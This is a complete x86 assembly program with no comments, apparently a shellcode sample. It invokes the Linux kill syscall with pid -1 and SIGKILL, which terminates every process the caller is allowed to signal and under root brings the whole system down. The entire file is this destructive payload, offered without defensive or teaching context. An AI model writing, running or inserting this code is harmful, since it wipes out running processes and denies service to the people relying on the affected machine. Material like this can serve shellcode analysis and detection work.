[BITS 32]

section .text:
global _start

_start:
xor eax, eax
xor ebx, ebx
xor ecx, ecx

push byte 37
pop eax

push byte -1
pop ebx

push byte 9
pop ecx

int 0x80
